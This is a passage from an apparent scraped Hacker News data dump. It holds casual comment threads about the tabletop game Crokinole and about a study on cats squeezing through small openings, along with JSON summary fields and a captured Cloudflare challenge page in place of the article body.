shuffleboard or curling, but the game can live on a small table and you can crank away games from the comfort of a chair with a beer. reply hibikir 12 minutes agoparentNot so few: It was a big hit in the Gathering of Friends convention almost 20 years ago, and BGG con started commissioning 2 new custom painted boards every year: One to raffle, and one to keep. It's a great activity to do while you are waiting for some people to show up. As any dexterity game, the issue is playing across skill levels. Going against an experienced player as a newbie means they better take it easy on you, or you are never scoring a point reply vundercind 31 minutes agoparentprevOn the board gaming website, Board Game Geek, It sits in the 47th overall rank by ratings (this is very high, even quite good games are often well south of 1,000 in the overall ranks) and fifth in the family games category. https://boardgamegeek.com/boardgame/521/crokinole I’d have had a board years ago if not for worrying it’d become another huge rarely-used thing to store or dispose of, after perhaps a year of good fun with it. Still haven’t played. reply binarymax 17 minutes agorootparentEh, chess is ranked #453, go #219 and backgammon #1545. The highest ranking game is \"Brass: Birmingham\" which I have never heard of - so I don't know what to make of these rankings. reply jefftk 8 minutes agorootparentThey're not ranking games on whether you've heard of them, but on how fun the BGG community finds them to play. Monopoly is rated #27,258. reply binarymax 0 minutes agorootparentI certainly understand that. But again I don't know what to make of the rankings. Yes, I know this is a niche community and yes I know there are more games than these classics...but comparison on Crokinole being #47 among thousands of games in the community is difficult to interpret for someone who hasn't played hundreds of different board games. pjot 1 hour agoprevWhen I was a kid my neighbors (who were from Ontario) taught me this game - we played all the time! It’s been over 20 years since and every few I try and recall what “that game” was. So glad to have seen this! reply hawski 1 hour agoprevI watched it two or three times before I understood I was watching a 30 second loop, only because I was getting impatient and showed all controls in the browser. Amazing feat of repeatability, but also nerve control. One mistake and you are losing it. Even if it looked less fun than later videos. reply ZeWaka 40 minutes agoprevThey've had this at PAX (East & West) the past years, it's been a ton of fun playing it and getting better. reply ink_13 0 minutes agoparentI remember the first year they introduced it, as a final in the Omegathon. It was really tense! reply Notorious_BLT 48 minutes agoprevGot a board a year ago and love it, a friend tried it once and bought a board too. I'm tempted to get one delivered to my parents and in-laws, so we can all play when I go out to visit. It's so simple to teach, and yet there's a ton of room for improving simply by playing. Any time we have people over, the board eventually comes down off the wall, and the first-timers get a quick lesson. reply zknow 28 minutes agoprevso cool to see this on here, I'm from rural southern Ontario and I feel like I always have to explain it to anyone from the city or 'not from these parts' reply graypegg 1 hour agoprevMy grandparents had a crokinole board! I'd say it's definitely a known game among older generations around southern ontario, but much less common with younger folk. It's really fun though, and families that do play it can get really competitive about it. reply yifanl 1 hour agoprevFor interested woodworkers, here's a nice post-mortem of someone's attempt at making a Crokinole board: https://boardgamegeek.com/thread/731671/postmortem-on-the-hi... (Complete with creating a set of jigs from scratch) Really shows how much has gone into a silly flicking game you play at the pub. reply msoucy 1 hour agoparentI, as a fledgling woodworker, was able to make my own board with some guidance from a friend. It's definitely a rewarding and educational project! Plus it makes a nice wall decoration when not in use. I used Purple Heart wood for the edges, which looks gorgeous but was difficult to work with. It took a few days of 3-4 hour blocks, due to a busy schedule, so a more experienced woodworker should be able to do one pretty easily. reply fanatic2pope 1 hour agoparentprevIt looks like those instructions are from 2011. CNC machines are pretty common these days and could help simplify it quite a bit. For example: https://hub.shapertools.com/creators/5cfea3909fc9260017675dc... reply tantalor 19 minutes agoprevA matchup not unlike ... Swift vs. Eilish What does that even mean. reply reducesuffering 9 minutes agoparentTaylor Swift and Billie Eilish are very big pop stars. It's trying to make a comparison like a battle of the \"greats\" reply mlhpdx 44 minutes agoprevI played this game as a kid at the local grange hall. I don’t recall how it came to be a part of the local scene back then, but I’ve recalled it fondly over the years. reply transcriptase 1 hour agoprevIt’s popular in Atlantic Canada too, especially when the weather prohibits washer toss! https://www.mynslc.com/en/Discover/Whats-the-Occasion/Happy-... reply adamgordonbell 1 hour agoprevPlayed in basement at grandmas house as a kid, in Southerner Ontario. I've never seen it spelt before. As a kid, it was said like: Crow-ken-no reply sgt 18 minutes agoparentThat makes sense. Crow-ken-no is kinda like Crokeno without the -le. reply bitlad 11 minutes agoprevLooks like carrom but easier. reply julianeon 1 hour agoprevThis seems like a great social game. I like how it's very tactile yet looks like it could be taught, or learned, in a few short minutes. reply eliasson 52 minutes agoparentIt is. Every now and then when we have guests at home we bring out the board and it is an immediate success. Age does not seem to matter, I have played with people between 10 to 80 years old everyone gets the mechanics within a few minutes. Highly recommended! reply idunnoman1222 1 hour agoprevIf you do play crokinol and have never used Gliss powder I suggest you try it, though it is a bit messy reply dicytea 1 hour agoprevFor those frustrated with the game not working, it looks like that the canvas rendering the disc can block the \"Place disc\" button, depending on your initial window size. To fix this, use your browser's device simulator (Ctrl+Shift+I -> Ctrl+Shift+M on Chrome, Ctrl+Shift+M on Firefox) to narrow the window's width, then refresh the page. reply Waterluvian 8 minutes agoprevHad no idea Crokinole was a local thing. In Grade 7 it became big in our classroom. We ended up having a weekly tournament. I could never shoot the pieces reliably, so I made a tool out of K-Nex that resembled an elastic-powered pool cue inside a barrel that rested nicely on the board. I even had a slider I could adjust to \"remember\" the right amount of power for a given shot. The specific rules that came with the board did not cover this, but after me absolutely crushing the first tournament it was summarily banned. This might be part of my engineer origin story. reply codenberg 1 hour agoprevhttps://www.youtube.com/@TraceyBoards/videos reply sleepybrett 1 hour agoprevShut Up and Sit Down, popular quirky boardgame review site/channel, did a review of the game, you can find it here: https://www.youtube.com/watch?v=XMKzeg78peg It goes over some mostly made up history and covers the rules and why the game is so addictive. Also talks about some games that are similar from different parts of the world like Carrom. I built myself a bigass hard to store circle after seeing the SUSD review and it's quite popular with the nieces and nephews and their cousins.. and the parents and grandparents around the holidays... and popular with my friends when we're a little tipsy and hanging out. reply titanomachy 1 hour agoprev> In non-competitive, less plamigerent settings, their skills really shine “Plamigerent” isn’t a word, and I can’t find any English words similar to it. It seems an unlikely typo. I wonder if the author included it to catch LLMs plagiarizing his work. reply mike_ivanov 1 hour agoparentLexical watermarking! If that's the case (and if this idea sticks), I'm wondering how far it could go. One could imagine a (dystopian?) world where everybody speaks they own highly individualized, maybe even copyrighted language, and where interpersonal communications happen via AI translators. reply collingreen 42 minutes agorootparent:( is this our generations version of cyberpunk theme? reply russsamora 1 hour agoparentprevyou found it! i suppose i owe you a prize... it was initially a test to see how closely people read, but was also curious about LLMs. reply ChrisArchitect 1 hour agorootparentA perfectly cromulent strategy! reply dimatura 38 minutes agoparentprevThat stood out to me too! It's a fun-sounding word. I googled it prepared to learn something new, only to get one hit - this article. reply abridges6523 35 minutes agoparentprevI was wondering about that too. reply renewiltord 16 minutes agoprevThis seems like a fun game. One that I enjoy playing is Carrom which a friend taught me. It's a similar game, except the pockets are in the four corners of a square board and then it's like pool. There are some fun trick shots people do online https://www.youtube.com/shorts/PTTeLj-fSQA And you can manage a couple of the trick shots yourself with a little practice. It's honestly quite lightweight and easy to learn which makes it fun. reply srameshc 1 hour agoprevGrowing up we called it Carrom board, which is square board with 4 pockets in the corners. I never knew there was an American version of it as Crokinole board. reply rendx 1 hour agoparentI played both and own a Crokinole board, but strongly prefer Carrom. It's similar but still quite different. reply sleepybrett 1 hour agoparentprevCanadian. I haven't played Carrom, but it's my understanding it's Indian in origin and plays a bit more like a billiards variant, even going so far as to use tiny pool cues. reply pixelatedindex 56 minutes agorootparentI haven’t played in a while but as long as I remember, there aren’t any pool cues but there are varying (house) rules on how/where the disc can be flicked reply darreninthenet 1 hour agoparentprevCrokinole is Canadian reply almostdeadguy 1 hour agoparentprevDifferent game, but Carrom is supposed to be great as well. I haven't played it but many of the folks I follow on BGG prefer it to Crokinole. reply amelius 41 minutes agoprevIs this an air table? reply ZeWaka 39 minutes agoparentNo, it's basically covered in extremely small sand particles that make the pucks glide - like table shuffleboard. reply sandymcmurray 1 hour agoprevAnd now you need to know about Crokicurl, a mash-up of Crokinole and curling! https://www.cbc.ca/news/canada/manitoba/crokicurl-curling-cr... reply blast 1 hour agoparentCurlinole would be easier to say... reply sergiotapia 46 minutes agoprevfeels like I could crush it in this game, i grew up playing lots of canicas as a kid in Bolivia :) reply smeagollover 1 hour agoprev [–] pool for children? reply yabones 49 minutes agoparentFar from it. This is the game that turns your calm book-and-armchair grandpa into a wild competitive lunatic. It turns your sweet auntie into a table-flipping animal. It's up there with Euchre for turning old people into unhinged gamers, and I absolutely love it for that. reply shimon 12 minutes agorootparentI'm particularly impressed by your choice of \"up there with Euchre\" as a metaphor to explain Crokinole. It's like you wanted to make it relatable for people in a larger geographic region, but only a little larger. reply dang 1 hour agoparentprevMore like shuffleboard. It's great for children (I grew up playing it), and is fun for children and adults to play together. reply anamexis 1 hour agoparentprev [–] Definitely not just for children! It's a really fun game for everyone, and it's a lot easier to have a crokinole board around the house than a pool table. reply sleepybrett 1 hour agorootparent [–] After building my own.. not much ;) big enough to be annoying to store (doesn't quite fit under the couch or in many tiny closets. A lot of them have hardware sunk into the bottom/back of the board for wall hanging. But yes, super fun. See the youtube video I posted elsewhere in the thread for a pretty great 'review' of this game which dates back to at least 1867. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "In October 2024, Connor Reinman and Jason Slater, renowned Crokinole players, achieved double perfect rounds at the World Crokinole Championship semifinals, a rare feat with odds of 1 in 277 rounds.",
      "Crokinole is a tabletop game from Ontario, Canada, akin to shuffleboard and curling, where players flick discs into scoring areas, aiming for a central hole worth 20 points.",
      "The game is gaining international popularity, although it has not yet been recognized as an Olympic sport."
    ],
    "commentSummary": [
      "Crokinole is a traditional board game with a rich history, particularly popular in Canada, and is often played on handmade boards passed down through generations.",
      "The game is tactile and social, similar to shuffleboard or curling, and can be played on a small table, making it accessible and enjoyable for all ages.",
      "Digital versions and adaptations, such as Crokicurl, a mix of Crokinole and curling, have emerged, expanding its reach and appeal in the board game community."
    ],
    "points": 160,
    "commentCount": 60,
    "retryCount": 0,
    "time": 1729184089
  },
  {
    "id": 41868683,
    "title": "Cats are (almost) liquid",
    "originLink": "https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8",
    "originBody": "Just a moment...*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}.main-content{margin:8rem auto;max-width:60rem;padding-left:1.5rem}@media (width Enable JavaScript and cookies to continue(function(){window._cf_chl_opt={cvId: '3',cZone: \"www.cell.com\",cType: 'managed',cNounce: '64921',cRay: '8d428a7b0ddc596e',cHash: '869284cce39ba54',cH: 'AmpKJEg5SEoyhPt8Gg6BenWsxwumw2UswxHx2pg71XE-1729191725-1.1.1.1-LrrkmlbHL68UF7evFuxR0gvBuibQ4E3tViQ9nnsM1UM27pAV.Tcw40rckqds64Iu',cUPMDTk: \"\\/iscience\\/fulltext\\/S2589-0042(24)02024-8?__cf_chl_tk=5VjGANNIg.6onRHUj2BiLs3m3vVwABnJemZikOxUWmg-1729191725-1.0.1.1-JyRgQgh0RwHx7wp684D_DsxxEpmr8dxZOGcT8JPZcuc\",cFPWv: 'b',cITimeS: '1729191725',cTTimeMs: '1000',cMTimeMs: '390000',cTplV: 5,cTplB: 'cf',cK: \"\",fa: \"\\/iscience\\/fulltext\\/S2589-0042(24)02024-8?__cf_chl_f_tk=5VjGANNIg.6onRHUj2BiLs3m3vVwABnJemZikOxUWmg-1729191725-1.0.1.1-JyRgQgh0RwHx7wp684D_DsxxEpmr8dxZOGcT8JPZcuc\",md: \"XtqI88ZWOsg_U3Tjmct8Veg43K5Q.5CRiyutlDsURn0-1729191725-1.1.1.1-6Y5ursqWa658v69ExEK9L2b8GrKKjM85tH5mNTsuWT_hg96eT8gzv1amT9kBCHGQU8CLf1zhikzKtrJBYxIq95knvM5cgbtJDQcrLrS_9dk43k79soQhkehrn8GIr6SEtV0vTg7ivotvvhKccJB03Y0ONezx.PCkuj.6We1KVcwza9TYE_SRj7Mgh7V8MKEgGEEB.MPdd68MtIwbBnGzMYyO24pZ2LhgjDqB.4HylLwDXhrf4tD2o0kBgeupV0dafRJEOzjRRWlILiLTwFhJIt1UysGdhV_KkpCp9NjJtSXQG.lGQknwelNX7KEJqL3l_PU0l5bRldZWkFJYKspokSEie3TmAzdIvnUtPtYo_vPkX.VeCPRjF004zJPJ9J6wPkhQYw.j6iXsETvC3FJAVzrqLO553jVGtd4j4E1pDJEiTUqqqcfTxyAnLgrl5St5en4LPvMJ7IcwrZstx9IUiw31Juetu3zcCP3HkZQ3myGLs6OMwO5IlgqV0NQUJ6KLoY.mo1GEeehPs.WqjV0imUKiYpsv8Y1X2ErnQ.hLaMFLTZwhKRSoJyjRyN8NntPBD43o3MNamG.uhrds4zgkjCKWFXovoqvg3fB4.Gg0EXhOnUmZE_bMJ0px_FBlUFwd9EC7_8ODfuGHtvGDi5NgUGNdlSXkigYhy3S0jJ1yt27gX6z9drRNEvcR2Kq.zqKwSSjOrLThj7.UUeG2E2rOSLCTGm_1pL49hWRTl2HPvZpXn0P2XNwyJUkElYK_QH0ejXduOLohvRDJ7mMbPlXvEavOYVZLMCjfi2IytcG3MdiubsdXl3NomPJyFjKpGVMcK6cbIn3z2RZgTHESybYzhN26zGibuaNIhJwsE9AfqPLCix0j7__pVhVlNHt6r8ukpyleq8TOtQKoUZAIb6evOnZb.fVx0zCntmjYqiaad1AMHvA4phQaZxfxP1DN22h4RGE6l8yhROScJ2D62.vNP_XULcqA1OFnu1tjjfzxLAkVWkTLYWO4sBWeQWhqTrTpRNodhcLSyoc6dEJ0oIVCtqZEdQqS5R_e0SlxCTWvxZAMHVkP2H6HPq4cxgOWrfo_tG0JNDo5yigFndNznAxy_nP0mjQNBw4V_z54vcE7WT8CumvlHNc5v0IIAH7LXNtU.xtMxMk.eWzm1bIVznsMS2zT.Bnx5qXJZDyHC4xQuA91JOWgYBc_yX1Iyiw6ErbHniTNJkuMfvP9lzMU59Rwo8FAaSJTaC_obc5FulRBWXnr1VS9RcOol1sQK85DU4qSAfB_kFlSgB.dLaeSJaCMySH9ajyaGZkBuoRCeB3QNxhGQa.2ATBAYPrvLvqEkqEfeLTHuNyo7swBBgg7QHOkeTJORBmqdq7zfbiWF4S0OBMY.sNsDukp.4bwDxY2Oika0ixyOrYhjLpWNnsRwfpoK.2.ZoiwEjSKSMzxgRRb9p1TlhNmDbewdyZy72MbRhcQ4sLwydWg7RVeaqZ4h4Xyzpq6FHpbbyV4yyxoS3QOIXXQl5zAEV1yNxw_GVJQE4W2xjDjRs4RpBJGIiWqreSrH_D8tdhHGi7OGi.VI63kULgxHQLoz0RsLQpYh9LYUFfGTWYRzBPU4Kl1U44g9XiIKxQC91XXbTkUafLyw4W4iiJOmRCZneT1UxjpC57vqcBh99WOc8PamuCeBwQ0uTmj8DelMRTBSyLG00bCaLVNbvK4YqrEtb7XylKEiAYU1WKSzHMIWfvz.DmfL9QtE3cdH1utwJSQUWFQfLm2y8TNqHK96LGqITHcjUOgX3UlZ40Ow2MS8AFpRDrCRFg6mJO7LxtZK_7xL3oTbInz6ZgJ1xtY4iZKkPGxrucziHVXMURl9lytshZ_Xou7PL2ii8LXX.ke3e_FYr_h9dkw8OA.QoWbhJGXe1g9tBbwo.shQvHuwJLclMm51QeZMrHbdzS1C8Iz8Hxl86uH9DPvYwDK4Nf3H4tXz3cUnTOCdRs_asSh7y8SsumMxo4jGkbTD3POCC_OrsU_usi92SIV2M5L64GEXXYFLOIIzzUaO3XI1cLm40_Hap1PDEzqDbqFOCkauvdE2LA8o.2Z7_NABzGXdbGe0BScSVTIyepRd4cFwHK7x9MuB1oJ6Zv4jSc_H2jiV6nZnk2BnN3QeQOxXwE1J5K.HFrbLcndEnUQPMmMYXVwjfmuAcO1DvgWPyXyiUXOZHsMblJB7Ze9UQJDHBkIfqvpsD5Ye1g_7tYkIxXrXy694VktFQ2VHwdZXpJQ2nGAX2IbLiDyjyvqPVTnZFO5eM7ECer62GxfGaGTdxYPmfw43fmsLvasFX4o3g9tLLEBgms6uLw3RG6.uxZxYIKcatLmqphxHltJYKPiMghBvOIsEegNu2icaRgOUythpE95uYphWtFEygmn9T06JvPdAjcD3K.ZqynY2Tg7Hyk4ISXJF4GBHuuSdcOGXsht_9pis0l3B6QcYC0mjDVRyjCSDehu3hwGIUNBfLnDyVqek6BQT4qdarBoO9ucTLzgQ1fLD7cJpldaTghADGDae.6ApN1JOc8Gu_5.gQ2WlAPXGPIP8bF14nlamC8BZveQEexoSe9duW7BIK_3LfzYHkWskw8wk2jF753E6cnltnpLCSbF3E0V4k7sZhgcyZ4AXBrOlQ\",mdrd: \"vJ83dssjIXgWxwCX3vskg6DO0KaZGIuYwQbsPMPz93k-1729191725-1.1.1.1-ys72IWIzjLS8OTs65VX6OTjmpJfR7OeGe9Fk9h8SE7Y5BB1rNsn1ga2VgDmRG9NISua1cczbC0MQa77qXHKHSIVIOUMg3fVutlfMBE_9FGXSu3QgTtcWtGZ.3qcbK64vQt4I.gf9RHM1xmzzht2Ow.ffNJQkzk6x7Ayi3wuq1Iv8vLvcXgh.Hf2hTrkzyWYZL0eqh9TYLyxbnT8.xA5PDaAuaPYIGTOg56e__fIlJ6gOOLrblDHjEPhooodmh8yNW6EvB3ry3Ub0uauk9otcWQaKst_QvrkHE2r9XstWwdX_k3IZxWJfuXKUgYmRpx9EsCk9bM7Kt_dlGtdkFasAea0EQnlaaem0W_GlAJxXm_6GfeboRta.LI8WVXZ3HVSME9iJ1B6X_py6HiIW2RDNmJ9pnbXC_glI.vfkRJWs7cfmv6x4Ul2XA_D9FP5hGKWdx0JKpeMUhe9g0GJtPgRujyl1ZKNPf5HLj.sUyeAi.L3xjYH2tUxn7vzsKPdrJyDaY8f4EOpHmy8hP8MahR7sskC6dUW5CTmSoOkIiF1IrkNCMhZdluUgc5V7Mjy_zRpM.fED_aiefEpcsbQ91XPSFRcWYoi2YMtyGIThkF7ZBl77wYx_xBcWUKVSiLSq1Ch_5ZdwTPRRIoG_487p_fablwLcGwJ6g2.7Y2mcw9zfzoiRorrfrJm0wLm8u7SHUhrxydbbM.QwqwmjV3fpv8_fllrALtiGPfvW0DAXN6l28qXCQ6dSv.wbxBMopJS8Tc8awYkOPyA4WV1Nf9LMv_AqSLInpEzqnlGhm5QDyvfX675BfncA__0214P03I5Q23NKGVYZYLmRFjiJ36qSc0JBlKcKLc8xfHHLo8erEyTz3gGJCYmMVhrbhwaTS0baMU3gryKnHehmQ8Wo4e0hoVPsHAw9gjhpmiwSiGFxzXqN2NeRVoq.QECJ6aF4wnAZx77MijXVUs3m5SLhbpM5E2XOJWmfXFPmaVhtJAJZfvLfmloDUQOpUcBh0jM8JlgcShFaQ2.FD.6Sv0JXFljMtyQNZy1EZfdlhVEIQDLwRRWox0UOWCfLcjz2fdQJdaSLxWioF8FLQLKpx.DXIKFI1y18N_VB6a6GZOmeSbWpVvPQKzuDQHnpC0IV1bfSsZHi9lKQdzg76PDzk5hN1YVWobw5RrGpn2T_R_OUlRCin0BjrDfrCctJMPiFcHTEwuEXLqWX8_reJCbiCQ323Ect4_IjgD6IVfYxXJbAqJJxO_Ymp7xObUCF_H19ICfctAnjKWd4dM44VL6Cxb.oScMTdp271QWrETDozi_NkR9B8sYyqNfl1cTcUwteA_FxPqhpjw1ekKs4jYgZYZinI44dWwV9PiUzOmKzgi_P9XvMXZ2dWl5vlBZVswjX2.FlcyV6ymYV2X_MVIpAzCok6htBmNY67W2qvA9gXUdyXvIbwA6mqXcAo5iYfUIRYI.5eOhkw4aXBLNdbkiQmsHDQ_2hShO3BC5jHoeI5rw1AafXayiA6C.3_3dYWDb77F5GMqQUboDFoqyKmUx6zm24Hb5cXUgrUhF0.CWwY.j0OPC3mL0c7qH83f5m53mJ8CWxKgOLMAJlR2a1uUTbHbQ0t8he8aeYpYPVN4qhsuZ21swo2kiCwi3mkQAkwLtsMEZ6pwgWPcUtVXzNCa_4oJtriWv1UYg4n_u5CoHtzxfwg54XuyShIxnb6LNw43CB.ZfP45sitXPm5a4fxMKJOfzEOqa2bTfUub9VqvnnvJBNS5NTmPHv68PPfymDdTTgeBv0oibGL0TUCLFNvT26YfRhG0SuJIuBKSKmiqY453azZJATiscJTTgMlnsPKz.1405nN04vpYIrCrLxW5qbLeHW8A_v276rnzQ1Wlc3_Gi4lytgmjrdNZM37rD63dH8Yb7P7OZ1U3SRfWj_eqX5L8uUDyOwIR2KlDJtU4zYJ7FbeRe.04_oYKFtgLRQOXSlHrd1Nl2jazepcy8rW6g3FkEdZ68ACkHD2IEfZKdZRhHyVodyaKZc.JcV._d74NuvJRW2daM3fL9Nhe7VRkvRCp1VDexQE3R3iQaM7Jb0VMmljABnpNCGOPuWIG3OsnRJi65gvKFIABM6EWhjSlCgfP9gL2_yHfysRXyVsYm8S8zUpxf5uCqaeRoZagco2wCRzWUrTzyOpkjCF3cwsMTSGqkJVSiP40sc19Pi0H2fgFTGwHxND68kalgsjy5uDUMzglAn3DQTlD4oIsiENwthm6cXrhGcWlNP9IrmKui53d.omwmGkQ_jYHeyx9xp1WM1wYqRPZovGJn46GSBZb4o_iMW0htZkU.JvLuTZ4VXji4o_.UXuXqXZyJFqEQPOHorSe2NuyV1zid9\",cRq: {ru: 'aHR0cHM6Ly93d3cuY2VsbC5jb20=',ra: 'TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IEdvb2dsZWJvdC8yLjE7ICtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0bWwp',d: '/w2eD315LzyUnxcriD2POpjhKZj6yiZDg23Uc52LTyLPawtfUShfwHDoC0aVuU7+pp16c4NW+IZ7zASUV2x6GI5MZtjhm/SdfMrgxy8+gxok8jU8ygWefd4Xyp2plJeqvN4ktoIWsIyjAkyzDV9hKXwKnnbYyHUL1DEcauz/pu14zi/H4uY5eyOySOmKhgSxAU8Rx6BDIYTzBQFkBUtcyYCnXDMChHuQnVL7/rImzuxdUAltln+CdEJCV6k750l5QRuobr/bWqaOtrpbcfpD3Tb10VLXNIwVFGS+AHRHbIU81KuUKECwJ5rdlA4Vxu5/yqvCakgkEnqh+7UdTsc6I38p8mBWVVhoihnGUI7Bqi0WrOXgQ6L1f+ZRUmtMPOwYWxLV3tv0iPc3OHgqTZKrvM5VHHwtZ6koA3bqMXkhg7OMB9rFU2K5DkDw1piFW0JF1w8ceFvpaQ8DkqOcd9nJtv/vsUiy0n1m9lABScZb7uxP/tXJmbtjkeoHE+sSxpLrPcDokgb6xyr2o2p/WgqEUAI/Yb/lZRlW0UDn06FSxuzj0C/nUmArBV/Lh6jLIkaw/d8QeJ/SCeV4A5S1BMMc+w==',t: 'MTcyOTE5MTcyNS4wMDAwMDA=',cT: Math.floor(Date.now() / 1000),m: '9vYvqhUF7MNnw+oumxehhX8SXF2ZMnXm5dE6j+zURFQ=',i1: 'qbpyrTdN85iKMapoPmwiDw==',i2: 'ZRI3Z+ABPtx+mg9pLNQlUQ==',zh: 'hR45DIaE5y+tZF6lHQqG7/mYqZDgBO7/9xlbfSpqhhQ=',uh: 'idqvltDEaw6z1eUpAaUFY/6rIUCphTJo6GMHGHVnQbg=',hh: 'k6a1h7FbBevPXfrarqhNReWaXiMzdMhHhSmOzUTk8LE=',}};var cpo = document.createElement('script');cpo.src = '/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=8d428a7b0ddc596e';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null, \"\\/iscience\\/fulltext\\/S2589-0042(24)02024-8?__cf_chl_rt_tk=5VjGANNIg.6onRHUj2BiLs3m3vVwABnJemZikOxUWmg-1729191725-1.0.1.1-JyRgQgh0RwHx7wp684D_DsxxEpmr8dxZOGcT8JPZcuc\" + window._cf_chl_opt.cOgUHash);cpo.onload = function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(cpo);}());",
    "commentLink": "https://news.ycombinator.com/item?id=41868683",
    "commentBody": "Cats are (almost) liquid (cell.com)152 points by lnyan 5 hours agohidepastfavorite97 comments move-on-by 3 hours ago> While dogs slowed down and hesitated before they attempted to use an uncomfortably small opening, in the case of cats, we did not detect this change in their behavior before their attempt to go through even the narrowest openings. However, remarkably, cats showed hesitation both before they attempted to penetrate the shortest openings, and while they moved through it. I just skimmed, but I didn’t see any mention whiskers. It’s seems to me that cats can make highly precise measurements of width just by sticking their heads in a space, but height judgments requires additional consideration. reply melvyn2 2 hours agoparent> Cats are also aided by their large and sensitive vibrissae, which are positioned on such locations of their head that the cat can detect nearby obstacles in closer encounters. Vibrissal sensation can compensate for the somewhat weaker vision in cats from closer distances or in poorly illuminated environments. Therefore, it is possible that cats approached the narrow openings in our experiment without differential hesitation, and they could use their vibrissae to assess the suitability of the apertures before penetrating them. reply move-on-by 2 hours agorootparentOh thank you! I’m just a lowly cat owner and did not know what vibrissae are. reply ChrisMarshallNY 2 hours agoparentprevIf you have ever put a cone on a cat (which lasts about five minutes), you see they get crazy. They hug the walls. Their whiskers are a major factor in their perception. I think they can also dislocate their spine. My cat likes to sit in what we call his \"Buddha\" position, with his back bent about 90 degrees, and his paws in front. This seems to be a common position. He'll sit like that for an hour. reply Optimal_Persona 2 hours agorootparentI think the cones must also screw up their aural spatial sensation (changing their perception of sound from fairly omni-directional, to seeming like all the sounds are coming from in front of the cone). reply shepherdjerred 2 hours agorootparentprevMy cats are weird and loved their cones after they got neutered. One would stick his head back in the cone after I took it off. reply ninalanyon 1 hour agorootparentI think all cats are weird in their own way. Our cat often sunbathed in the middle of parking space across the road. We occasionally had to go out to fetch him because he would refuse to move when someone started to drive into the space. reply diggan 2 hours agoparentprevFrom skimming the HN comments: > Wiskers are mentioned, but using the scientific name - vibrissae https://news.ycombinator.com/item?id=41870897 reply pmahoney 4 hours agoprevCalvin vindicated https://www.gocomics.com/calvinandhobbes/1993/04/20 reply accrual 3 hours agoparentI love C&H and am blown away there was something so applicable. Felt like an XKCD moment! reply cosmojg 10 minutes agorootparentC&H moments are the original XKCD moments! reply pvg 3 hours agoprevMissing a cite to some pioneering work on this in the 30s by A.S.J. Tessimond [1] Cats no less liquid than their shadows Offer no angles to the wind. They slip, diminished, neat through loopholes Less than themselves; will not be pinned [1]https://www.blueridgejournal.com/poems/asjt-cats.htm reply evilotto 1 hour agoparentNot to mention Fardin, 2014. reply wormlord 4 hours agoprevBefore I had cats, I used to think of them in terms of other animals. What I mean is that a dog or a horse is very defined by its skeletal structure. They are like popsicle stick armatures with some flesh thrown on. Now I think of cats more like amorphous blobs with some hard bits stuck on. I think anyone who owns a cat will know what I mean by this. reply bl4ckneon 4 hours agoparentMy cat often lays down twisted 180 degrees or more. Just doing whatever they want, defying laws of nature. reply 9dev 3 hours agorootparentWell, dogs also do this—I present to you my majestically twisted creature: https://imgur.com/a/5WcYzSw I have no clue how that is even possible. reply voidmain0001 2 hours agorootparentI'm also stupefied by a human doing it. https://imgur.com/a/W7bcLZo Taken from: https://www.gq.com/story/aleksei-goloborodko-real-life-diet reply squarefoot 3 hours agorootparentprevBrought memories of one of my cats (now silent meow) who also added the Italian equivalent of a middle finger. https://imgur.com/a/GFukfFP reply debo_ 3 hours agorootparentprevYour dog is the inverse of the Firefox. reply lisper 3 hours agorootparentprevClearly your dog has been possessed by a demon. reply hugocast 2 hours agorootparentprevDog Yoga reply bayindirh 3 hours agorootparentprevI almost sprayed all my tea to my monitor and keyboard. Wish both of you a happy and derpy life together. reply nonameiguess 3 hours agoparentprevFor what it's worth, their hips and shoulders are actually limited in range of motion compared to humans, due to the very high muscle attachment points that are also what make them so amazingly strong and explosive for their small size. But an extremely flexible spine combined with the ability to dislocate key joints means they can still fit into very small, narrow spaces, presumably an adaptation allowing them to hunt small rodents that burrow and hide out in underground dens. Which I assume is why they have the instinct to immediately jump into and check out any box or cabinet or other enclosed space you open. You never know if there might be some voles in there. reply psunavy03 3 hours agorootparentThey actually prefer to jump in a box because to them, it's a safe space to hide and watch. Cats look for spaces like that because their wild ancestors (and feral cats now) are small enough that they are both predators and prey. reply fluoridation 3 hours agorootparentYup. Same reason why they like to climb to high places. They can feel safe and survey the surroundings. Additionally, cats will hide in confined spaces when ill or in pain; a sudden desire to hide for prolonged periods is a sign that it needs to see a vet. reply kijin 2 hours agorootparentI think a lot of oddities we attribute to cats can be explained by the fact that they are both predator and prey. No other animal we spend a lot of time with occupies such a schizophrenic position in the food chain. reply jerf 2 hours agorootparentI've noticed free-range chickens have some characteristics that derive from a similar position; chickens are not \"predators\" but they will happily predate if the opportunity arises, and they are also prey. Being birds and natural flock animals, it manifests differently, and there's some interesting behaviors I've noticed. \"Chicken\" as a synonym for \"total, utter coward\" is slander. Yes, running is their first play, but they do not just roll over and die like a sheep or a rabbit; if running isn't working they can and do fight back for all they are worth. And they don't have to be \"backed into a corner\" and only fight if it's the absolute last option, it just has to be as I phrased it: \"running isn't working\". reply refulgentis 3 hours agorootparentprev> actually I spit my coffee out reply stavros 3 hours agorootparentprev> You never know if there might be some voles in there I like to think I always know if there might be some voles in my boxes and cabinets. reply jeffbee 3 hours agoparentprevHorse is practically all air. That's their secret. They are blimps with legs. reply bayindirh 4 hours agoparentprevI, for one, know, understand and welcome our almost liquid feline overlords. reply wiredfool 4 hours agorootparentPurring bags of mostly water. reply tirant 58 minutes agoprevThese are old news for those of us that grew bonsai kittens in the late 90s. https://web.archive.org/web/20050203111131/http://bonsaikitt... Obviously it was a 